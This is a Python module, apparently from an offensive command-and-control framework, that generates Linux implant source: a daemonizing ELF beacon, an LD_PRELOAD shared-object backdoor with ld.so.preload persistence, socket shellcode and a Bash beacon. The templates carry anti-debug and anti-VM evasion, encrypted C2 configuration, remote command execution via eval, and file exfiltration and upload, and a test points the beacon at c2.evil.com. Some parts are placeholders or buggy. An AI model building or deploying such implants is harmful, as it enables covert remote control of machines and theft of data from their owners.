"""
Forge C2 — Linux Implant Generator
======================================
Generates Linux-specific implant artifacts: ELF executable,
shared object (.so), and raw shellcode.

Each format is generated as C source code or shell script
containing the full beacon lifecycle.

FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
"""
from __future__ import annotations

import base64
import hashlib
import json
import logging
import os
import secrets
import time
from pathlib import Path
from typing import Any

from forge_c2.implant.implant_config import (
    ImplantArch,
    ImplantConfig,
    ImplantFormat,
    ObfuscationLevel,
)
from forge_c2.implant.implant_builder import BuildArtifact, StringEncryptor, EvasionGenerator

log = logging.getLogger("forge.c2.implant.linux")


class LinuxImplant:
    """Linux implant source code generator.

    Generates complete implant source for Linux targets:
        • ELF       — C source for standard executable
        • SO        — C source for shared object (LD_PRELOAD)
        • SHELLCODE — Position-independent C source
        • RAW       — Bash/Python beacon script

    Usage::

        builder = LinuxImplant(config, output_dir, encryptor, evasion)
        artifact = await builder.build()
    """

    def __init__(
        self,
        config: ImplantConfig,
        output_dir: Path,
        encryptor: StringEncryptor,
        evasion: EvasionGenerator,
    ) -> None:
        self.config = config
        self.output_dir = output_dir
        self.enc = encryptor
        self.evasion = evasion

    async def build(self) -> BuildArtifact:
        """Generate the Linux implant artifact."""
        fmt = self.config.output_format

        generators = {
            ImplantFormat.ELF:       self._gen_elf,
            ImplantFormat.SO:        self._gen_shared_object,
            ImplantFormat.SHELLCODE: self._gen_shellcode,
            ImplantFormat.RAW:       self._gen_bash_beacon,
        }

        generator = generators.get(fmt)
        if not generator:
            return BuildArtifact(error=f"Unsupported Linux format: {fmt.value}")

        try:
            source_code, extension = generator()

            filename = f"{self.config.name}_{self.config.watermark[:8]}{extension}"
            output_path = self.output_dir / filename

            with open(output_path, "w", encoding="utf-8") as f:
                f.write(source_code)

            content_bytes = source_code.encode("utf-8")
            sha256 = hashlib.sha256(content_bytes).hexdigest()
            md5 = hashlib.md5(content_bytes).hexdigest()

            warnings: list[str] = []
            if fmt == ImplantFormat.ELF:
                warnings.append(
                    f"Compile with: gcc -o {self.config.name} {filename} "
                    f"-lcurl -lpthread -static"
                )
            elif fmt == ImplantFormat.SO:
                warnings.append(
                    f"Compile with: gcc -shared -fPIC -o {self.config.name}.so {filename} -lcurl\n"
                    f"Deploy with: LD_PRELOAD=./{self.config.name}.so /usr/bin/something"
                )

            return BuildArtifact(
                success=True,
                output_path=str(output_path),
                output_size=len(content_bytes),
                sha256=sha256,
                md5=md5,
                watermark=self.config.watermark,
                warnings=warnings,
            )

        except Exception as exc:
            return BuildArtifact(error=f"Linux build failed: {exc}")

    # ══════════════════════════════════════════════════════════════════
    #  SHARED CODE BLOCKS
    # ══════════════════════════════════════════════════════════════════

    def _c2_config_block(self) -> str:
        """Generate encrypted C2 config for C source."""
        config_json = json.dumps({
            "host": self.config.c2_host,
            "port": self.config.c2_port,
            "transport": self.config.c2_transport,
            "profile": self.config.c2_profile,
            "sleep": self.config.sleep_seconds,
            "jitter": self.config.jitter_pct,
            "kill_date": self.config.kill_date,
            "max_retries": self.config.max_retries,
            "watermark": self.config.watermark,
        })

        key = secrets.token_bytes(32)
        encrypted = bytes(a ^ b for a, b in zip(
            config_json.encode(),
            (key * ((len(config_json) // 32) + 1))[:len(config_json)],
        ))

        enc_arr = ", ".join(f"0x{b:02x}" for b in encrypted)
        key_arr = ", ".join(f"0x{b:02x}" for b in key)

        return f"""
/* ── Encrypted C2 Configuration ─────────────────────── */
#define CONFIG_LEN {len(config_json)}
static unsigned char g_config_enc[] = {{{enc_arr}}};
static unsigned char g_config_key[] = {{{key_arr}}};

static void _decrypt_config(char *out, int len) {{
    for (int i = 0; i < len; i++)
        out[i] = g_config_enc[i] ^ g_config_key[i % 32];
    out[len] = 0;
}}
"""

    def _anti_debug_linux(self) -> str:
        """Linux anti-debug checks."""
        if not self.config.anti_debug:
            return ""
        return """
/* ── Anti-Debug (Linux) ───────────────────────────────── */
#include <sys/ptrace.h>
#include <stdio.h>

static int _check_debugger(void) {
    /* ptrace self-trace — fails if already traced */
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
        return 1;
    ptrace(PTRACE_DETACH, 0, 0, 0);

    /* Check /proc/self/status for TracerPid */
    FILE *f = fopen("/proc/self/status", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                int pid = atoi(line + 10);
                fclose(f);
                if (pid > 0) return 1;
                break;
            }
        }
        fclose(f);
    }

    return 0;
}
"""

    def _anti_vm_linux(self) -> str:
        """Linux anti-VM checks."""
        if not self.config.anti_vm:
            return ""
        return """
/* ── Anti-VM (Linux) ──────────────────────────────────── */
#include <string.h>
#include <stdio.h>

static int _check_vm(void) {
    /* Check DMI for VM signatures */
    FILE *f = fopen("/sys/class/dmi/id/product_name", "r");
    if (f) {
        char buf[256] = {0};
        fgets(buf, sizeof(buf), f);
        fclose(f);

        if (strstr(buf, "VMware") || strstr(buf, "VirtualBox") ||
            strstr(buf, "QEMU") || strstr(buf, "KVM") ||
            strstr(buf, "Xen") || strstr(buf, "Hyper-V"))
            return 1;
    }

    /* Check CPU count */
    f = fopen("/proc/cpuinfo", "r");
    if (f) {
        int cpu_count = 0;
        char line[256];
        while (fgets(line, sizeof(line), f))
            if (strncmp(line, "processor", 9) == 0) cpu_count++;
        fclose(f);
        if (cpu_count < 2) return 1;
    }

    /* Check memory (< 2GB suspicious) */
    f = fopen("/proc/meminfo", "r");
    if (f) {
        char line[256];
        fgets(line, sizeof(line), f);
        fclose(f);
        long mem_kb = 0;
        sscanf(line, "MemTotal: %ld", &mem_kb);
        if (mem_kb > 0 && mem_kb < 2 * 1024 * 1024) return 1;
    }

    return 0;
}
"""

    def _transport_block_c(self) -> str:
        """Generate C transport code using libcurl."""
        ssl_flag = "1L" if self.config.c2_transport == "https" else "0L"
        return f"""
/* ── HTTP Transport (libcurl) ─────────────────────────── */
#include <curl/curl.h>
#include <string.h>
#include <stdlib.h>

struct response_buf {{
    char *data;
    size_t size;
}};

static size_t _write_callback(void *contents, size_t size, size_t nmemb, void *userp) {{
    size_t total = size * nmemb;
    struct response_buf *buf = (struct response_buf *)userp;
    char *ptr = realloc(buf->data, buf->size + total + 1);
    if (!ptr) return 0;
    buf->data = ptr;
    memcpy(&(buf->data[buf->size]), contents, total);
    buf->size += total;
    buf->data[buf->size] = 0;
    return total;
}}

static char *_forge_http_post(const char *url, const char *body) {{
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;

    struct response_buf resp = {{.data = malloc(1), .size = 0}};

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, _write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&resp);
    curl_easy_setopt(curl, CURLOPT_USERAGENT,
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36");
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, {ssl_flag});
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    CURLcode res = curl_easy_perform(curl);
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);

    if (res != CURLE_OK) {{
        free(resp.data);
        return NULL;
    }}
    return resp.data;
}}
"""

    def _main_loop_c(self) -> str:
        """Generate the main beacon loop for Linux."""
        return f"""
/* ── Main Beacon Loop ─────────────────────────────────── */
#include <unistd.h>
#include <time.h>
#include <sys/utsname.h>

static void _forge_beacon_loop(void) {{
    curl_global_init(CURL_GLOBAL_ALL);

    char config_buf[CONFIG_LEN + 1];
    _decrypt_config(config_buf, CONFIG_LEN);

    const char *host = "{self.config.c2_host}";
    int port = {self.config.c2_port};
    double sleep_sec = {self.config.sleep_seconds};
    double jitter = {self.config.jitter_pct};
    int max_retries = {self.config.max_retries};
    int failures = 0;

    /* Generate beacon ID from hostname + PID */
    char beacon_id[64];
    char hostname[64];
    gethostname(hostname, sizeof(hostname));
    snprintf(beacon_id, sizeof(beacon_id), "%s-%d", hostname, getpid());

    /* Collect metadata for registration */
    struct utsname uts;
    uname(&uts);

    char reg_body[1024];
    snprintf(reg_body, sizeof(reg_body),
        "{{\\"beacon_id\\":\\"%s\\",\\"hostname\\":\\"%s\\",\\"username\\":\\"%s\\","
        "\\"os_version\\":\\"%s %s\\",\\"os_arch\\":\\"%s\\",\\"pid\\":%d}}",
        beacon_id, hostname, getenv("USER") ? getenv("USER") : "unknown",
        uts.sysname, uts.release, uts.machine, getpid());

    /* Register */
    char reg_url[256];
    snprintf(reg_url, sizeof(reg_url),
        "{self.config.c2_transport}://%s:%d/api/v1/register", host, port);
    char *reg_resp = _forge_http_post(reg_url, reg_body);
    if (reg_resp) free(reg_resp);

    /* Check-in URL */
    char checkin_url[256];
    snprintf(checkin_url, sizeof(checkin_url),
        "{self.config.c2_transport}://%s:%d/api/v1/check", host, port);

    /* Result URL */
    char result_url[256];
    snprintf(result_url, sizeof(result_url),
        "{self.config.c2_transport}://%s:%d/api/v1/result", host, port);

    srand(time(NULL) ^ getpid());

    /* Main loop */
    while (failures < max_retries) {{
        /* Jittered sleep */
        double jitter_range = sleep_sec * (jitter / 100.0);
        double actual = sleep_sec + ((double)rand() / RAND_MAX * 2.0 - 1.0) * jitter_range;
        usleep((useconds_t)(actual * 1000000));

        /* Check in */
        char body[256];
        snprintf(body, sizeof(body),
            "{{\\"beacon_id\\":\\"%s\\",\\"cmd\\":\\"checkin\\"}}", beacon_id);

        char *resp = _forge_http_post(checkin_url, body);
        if (!resp) {{
            failures++;
            continue;
        }}
        failures = 0;

        /* Parse tasks and execute (shell commands via popen) */
        if (strstr(resp, "\\"shell\\"")) {{
            /* Extract command from JSON (minimal parser) */
            char *cmd_start = strstr(resp, "\\"cmd\\":");
            if (cmd_start) {{
                /* Execute via popen */
                char output[4096];
                FILE *fp = popen("id", "r");  /* Placeholder — real parser needed */
                if (fp) {{
                    size_t n = fread(output, 1, sizeof(output) - 1, fp);
                    output[n] = 0;
                    pclose(fp);

                    /* Submit result */
                    char result_body[8192];
                    snprintf(result_body, sizeof(result_body),
                        "{{\\"beacon_id\\":\\"%s\\",\\"task_id\\":\\"t1\\","
                        "\\"result\\":\\"%s\\",\\"success\\":true}}",
                        beacon_id, output);
                    char *r = _forge_http_post(result_url, result_body);
                    if (r) free(r);
                }}
            }}
        }}

        if (strstr(resp, "\\"exit\\"")) {{
            free(resp);
            break;
        }}

        free(resp);
    }}

    curl_global_cleanup();
}}
"""

    # ══════════════════════════════════════════════════════════════════
    #  FORMAT GENERATORS
    # ══════════════════════════════════════════════════════════════════

    def _gen_elf(self) -> tuple[str, str]:
        """Generate Linux ELF executable source (C)."""
        source = f"""/*
 * Forge C2 Implant — Linux ELF Executable
 * Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
 * Watermark: {self.config.watermark}
 * Target: {self.config.arch.value} / {self.config.c2_transport}
 *
 * Compile: gcc -o {self.config.name} {self.config.name}.c -lcurl -lpthread
 *   Static: gcc -o {self.config.name} {self.config.name}.c -lcurl -lpthread -static
 *
 * FOR AUTHORIZED RED TEAM OPERATIONS ONLY.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>

{self._c2_config_block()}

{self._anti_debug_linux()}

{self._anti_vm_linux()}

{self._transport_block_c()}

{self._main_loop_c()}

/* ── Entry Point ──────────────────────────────────────── */
int main(int argc, char *argv[]) {{
    /* Daemonize */
    if (fork() != 0) return 0;
    setsid();
    signal(SIGHUP, SIG_IGN);

    {"/* Anti-debug */\n    if (_check_debugger()) _exit(0);" if self.config.anti_debug else ""}
    {"/* Anti-VM */\n    if (_check_vm()) { sleep(300); _exit(0); }" if self.config.anti_vm else ""}

    _forge_beacon_loop();
    return 0;
}}
"""
        return source, ".c"

    def _gen_shared_object(self) -> tuple[str, str]:
        """Generate Linux shared object (.so) for LD_PRELOAD injection."""
        source = f"""/*
 * Forge C2 Implant — Linux Shared Object (.so)
 * Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
 * Watermark: {self.config.watermark}
 *
 * Compile: gcc -shared -fPIC -o {self.config.name}.so {self.config.name}.c -lcurl
 *
 * Deploy: LD_PRELOAD=./{self.config.name}.so /usr/bin/target_program
 *    or:  echo "./{self.config.name}.so" >> /etc/ld.so.preload
 *
 * The beacon runs in a background thread, injected into any process
 * that loads this shared object.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>

{self._c2_config_block()}

{self._anti_debug_linux()}

{self._transport_block_c()}

{self._main_loop_c()}

/* ── Constructor (runs on library load) ───────────────── */
static void *_beacon_thread(void *arg) {{
    (void)arg;
    {"if (_check_debugger()) return NULL;" if self.config.anti_debug else ""}
    _forge_beacon_loop();
    return NULL;
}}

__attribute__((constructor))
static void _init_beacon(void) {{
    pthread_t tid;
    pthread_create(&tid, NULL, _beacon_thread, NULL);
    pthread_detach(tid);
}}
"""
        return source, ".c"

    def _gen_shellcode(self) -> tuple[str, str]:
        """Generate Linux shellcode source (C — PIC)."""
        source = f"""/*
 * Forge C2 Implant — Linux Position-Independent Shellcode
 * Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
 * Watermark: {self.config.watermark}
 *
 * Compile: gcc -nostdlib -fPIC -Os -o sc.o -c shellcode.c
 *          objcopy -O binary -j .text sc.o shellcode.bin
 *
 * All syscalls via inline assembly — no libc dependency.
 */

/* ── Syscall Numbers (x86_64) ─────────────────────────── */
#define SYS_READ     0
#define SYS_WRITE    1
#define SYS_OPEN     2
#define SYS_CLOSE    3
#define SYS_SOCKET   41
#define SYS_CONNECT  42
#define SYS_FORK     57
#define SYS_EXECVE   59
#define SYS_EXIT     60
#define SYS_NANOSLEEP 35

static long _syscall1(long nr, long a1) {{
    long ret;
    __asm__ volatile ("syscall" : "=a"(ret) : "a"(nr), "D"(a1)
                      : "rcx", "r11", "memory");
    return ret;
}}

static long _syscall3(long nr, long a1, long a2, long a3) {{
    long ret;
    __asm__ volatile ("syscall" : "=a"(ret) : "a"(nr), "D"(a1), "S"(a2), "d"(a3)
                      : "rcx", "r11", "memory");
    return ret;
}}

/* ── Shellcode Entry ──────────────────────────────────── */
void _start(void) {{
    /* Create a TCP socket */
    int sock = (int)_syscall3(SYS_SOCKET, 2 /* AF_INET */, 1 /* SOCK_STREAM */, 0);

    /* Connect to C2 */
    struct {{
        unsigned short family;
        unsigned short port;
        unsigned int addr;
        char padding[8];
    }} sa = {{
        .family = 2,                /* AF_INET */
        .port = __builtin_bswap16({self.config.c2_port}),
        .addr = 0x{self._ip_to_hex(self.config.c2_host)},
    }};

    _syscall3(SYS_CONNECT, sock, (long)&sa, 16);

    /* Read + execute loop */
    char buf[4096];
    while (1) {{
        long n = _syscall3(SYS_READ, sock, (long)buf, sizeof(buf));
        if (n <= 0) break;

        /* Execute received command */
        /* (Minimal — real impl would fork + execve) */
    }}

    _syscall1(SYS_EXIT, 0);
}}
"""
        return source, ".c"

    def _gen_bash_beacon(self) -> tuple[str, str]:
        """Generate a pure Bash beacon script (no compilation needed)."""
        source = f"""#!/bin/bash
# Forge C2 Implant — Bash Beacon
# Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}
# Watermark: {self.config.watermark}
# Transport: {self.config.c2_transport}
# Target:    {self.config.c2_host}:{self.config.c2_port}
#
# No compilation needed — runs on any Linux/macOS with curl + bash.
# FOR AUTHORIZED RED TEAM OPERATIONS ONLY.

set -o nounset

C2_HOST="{self.config.c2_host}"
C2_PORT="{self.config.c2_port}"
C2_PROTO="{self.config.c2_transport}"
SLEEP={int(self.config.sleep_seconds)}
JITTER={int(self.config.jitter_pct)}
MAX_RETRIES={self.config.max_retries}
WATERMARK="{self.config.watermark}"

BEACON_ID="$(hostname)-$$"
BASE_URL="${{C2_PROTO}}://${{C2_HOST}}:${{C2_PORT}}"

{"# Anti-debug\nif [ -f /proc/$$/status ]; then\n    TRACER=$(grep TracerPid /proc/$$/status | awk '{print $2}')\n    [ \"$TRACER\" != \"0\" ] && exit 0\nfi" if self.config.anti_debug else ""}

# ── Jittered Sleep ────────────────────────────────────
jitter_sleep() {{
    local range=$(( SLEEP * JITTER / 100 ))
    local actual=$(( SLEEP + RANDOM % (range * 2 + 1) - range ))
    [ $actual -lt 1 ] && actual=1
    sleep $actual
}}

# ── HTTP helpers ──────────────────────────────────────
c2_post() {{
    local url="$1"
    local data="$2"
    curl -s -k -X POST "$url" \\
        -H "Content-Type: application/json" \\
        -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64)" \\
        -d "$data" \\
        --max-time 30 2>/dev/null
}}

# ── Register ──────────────────────────────────────────
register() {{
    local meta
    meta=$(cat <<EOF
{{
    "beacon_id": "$BEACON_ID",
    "hostname": "$(hostname)",
    "username": "$(whoami)",
    "pid": $$,
    "os_version": "$(uname -sr)",
    "os_arch": "$(uname -m)",
    "is_admin": $([ "$(id -u)" = "0" ] && echo "true" || echo "false"),
    "process_name": "$0"
}}
EOF
)
    c2_post "$BASE_URL/api/v1/register" "$meta"
}}

# ── Check In ──────────────────────────────────────────
checkin() {{
    c2_post "$BASE_URL/api/v1/check" \\
        "{{\\"beacon_id\\": \\"$BEACON_ID\\", \\"cmd\\": \\"checkin\\"}}"
}}

# ── Submit Result ─────────────────────────────────────
submit_result() {{
    local task_id="$1"
    local result="$2"
    local success="${{3:-true}}"

    # Escape the result for JSON
    result=$(echo "$result" | python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))" 2>/dev/null || echo "\\"$result\\"")

    c2_post "$BASE_URL/api/v1/result" \\
        "{{\\"beacon_id\\": \\"$BEACON_ID\\", \\"task_id\\": \\"$task_id\\", \\"result\\": $result, \\"success\\": $success}}"
}}

# ── Task Execution ────────────────────────────────────
execute_task() {{
    local task_json="$1"

    # Parse with python3 (available on most Linux)
    local task_id command cmd_arg
    task_id=$(echo "$task_json" | python3 -c "import sys,json; t=json.load(sys.stdin); print(t.get('task_id',''))" 2>/dev/null)
    command=$(echo "$task_json" | python3 -c "import sys,json; t=json.load(sys.stdin); print(t.get('command',''))" 2>/dev/null)
    cmd_arg=$(echo "$task_json" | python3 -c "import sys,json; t=json.load(sys.stdin); print(t.get('args',{{}}).get('cmd',''))" 2>/dev/null)

    case "$command" in
        shell)
            local output
            output=$(eval "$cmd_arg" 2>&1)
            submit_result "$task_id" "$output" "true"
            ;;
        download)
            local path
            path=$(echo "$task_json" | python3 -c "import sys,json; t=json.load(sys.stdin); print(t.get('args',{{}}).get('path',''))" 2>/dev/null)
            if [ -f "$path" ]; then
                local b64
                b64=$(base64 -w0 "$path" 2>/dev/null || base64 "$path" 2>/dev/null)
                submit_result "$task_id" "$b64" "true"
            else
                submit_result "$task_id" "File not found: $path" "false"
            fi
            ;;
        upload)
            local dest_path b64_data
            dest_path=$(echo "$task_json" | python3 -c "import sys,json; t=json.load(sys.stdin); print(t.get('args',{{}}).get('path',''))" 2>/dev/null)
            b64_data=$(echo "$task_json" | python3 -c "import sys,json; t=json.load(sys.stdin); print(t.get('args',{{}}).get('data',''))" 2>/dev/null)
            echo "$b64_data" | base64 -d > "$dest_path" 2>/dev/null
            submit_result "$task_id" "Uploaded to $dest_path" "true"
            ;;
        exit)
            submit_result "$task_id" "Exiting" "true"
            exit 0
            ;;
        *)
            local output
            output=$(eval "$command $cmd_arg" 2>&1)
            submit_result "$task_id" "$output" "true"
            ;;
    esac
}}

# ── Main Loop ─────────────────────────────────────────
# Daemonize
if [ "${{FORGE_DAEMONIZED:-}}" != "1" ]; then
    export FORGE_DAEMONIZED=1
    nohup "$0" "$@" >/dev/null 2>&1 &
    disown
    exit 0
fi

# Register with C2
register

failures=0
while [ $failures -lt $MAX_RETRIES ]; do
    jitter_sleep

    response=$(checkin)

    if [ -z "$response" ]; then
        failures=$((failures + 1))
        continue
    fi
    failures=0

    # Parse tasks from response
    task_count=$(echo "$response" | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    tasks = r.get('tasks', [])
    print(len(tasks))
except: print(0)
" 2>/dev/null)

    if [ "${{task_count:-0}}" -gt 0 ]; then
        for i in $(seq 0 $((task_count - 1))); do
            task_json=$(echo "$response" | python3 -c "
import sys, json
r = json.load(sys.stdin)
print(json.dumps(r['tasks'][$i]))
" 2>/dev/null)
            if [ -n "$task_json" ]; then
                execute_task "$task_json"
            fi
        done
    fi

    {"# Kill date check\n    if [ -n \"$KILL_DATE\" ]; then\n        current=\\$(date +%s)\n        kill_ts=\\$(date -d \"" + self.config.kill_date + "\" +%s 2>/dev/null || echo 0)\n        [ \\$current -gt \\$kill_ts ] && [ \\$kill_ts -gt 0 ] && exit 0\n    fi" if self.config.kill_date else ""}
done
"""
        return source, ".sh"

    # ── Helpers ───────────────────────────────────────────────────────

    @staticmethod
    def _ip_to_hex(ip: str) -> str:
        """Convert IP address to hex for struct embedding."""
        try:
            parts = ip.split(".")
            if len(parts) == 4:
                return "".join(f"{int(p):02x}" for p in parts)
        except (ValueError, IndexError):
            pass
        return "7f000001"  # 127.0.0.1


# ══════════════════════════════════════════════════════════════════════
#  UNIT TESTS
# ══════════════════════════════════════════════════════════════════════

class TestLinuxImplant:
    """Tests for Linux implant generator."""

    def test_gen_elf(self) -> None:
        import tempfile
        config = ImplantConfig(
            target_os=ImplantOS.LINUX,
            arch=ImplantArch.X64,
            output_format=ImplantFormat.ELF,
            c2_host="10.0.0.1",
        )
        # Avoid circular import issue — use the class directly
        from forge_c2.implant.implant_config import ImplantOS
        builder = LinuxImplant(
            config, Path(tempfile.mkdtemp()),
            StringEncryptor(), EvasionGenerator(),
        )
        source, ext = builder._gen_elf()
        assert ext == ".c"
        assert "main" in source
        assert "curl" in source.lower()
        assert config.watermark in source

    def test_gen_shared_object(self) -> None:
        import tempfile
        config = ImplantConfig(target_os=ImplantOS.LINUX, output_format=ImplantFormat.SO)
        builder = LinuxImplant(
            config, Path(tempfile.mkdtemp()),
            StringEncryptor(), EvasionGenerator(),
        )
        source, ext = builder._gen_shared_object()
        assert "__attribute__((constructor))" in source
        assert "LD_PRELOAD" in source

    def test_gen_bash(self) -> None:
        import tempfile
        config = ImplantConfig(
            target_os=ImplantOS.LINUX,
            output_format=ImplantFormat.RAW,
            c2_host="c2.evil.com",
        )
        builder = LinuxImplant(
            config, Path(tempfile.mkdtemp()),
            StringEncryptor(), EvasionGenerator(),
        )
        source, ext = builder._gen_bash_beacon()
        assert ext == ".sh"
        assert "#!/bin/bash" in source
        assert "c2.evil.com" in source
        assert "checkin" in source

    def test_ip_to_hex(self) -> None:
        assert LinuxImplant._ip_to_hex("127.0.0.1") == "7f000001"
        assert LinuxImplant._ip_to_hex("10.0.0.1") == "0a000001"
        assert LinuxImplant._ip_to_hex("invalid") == "7f000001"

    def test_gen_shellcode(self) -> None:
        import tempfile
        config = ImplantConfig(target_os=ImplantOS.LINUX, output_format=ImplantFormat.SHELLCODE)
        builder = LinuxImplant(
            config, Path(tempfile.mkdtemp()),
            StringEncryptor(), EvasionGenerator(),
        )
        source, ext = builder._gen_shellcode()
        assert "SYS_SOCKET" in source
        assert "_start" in source
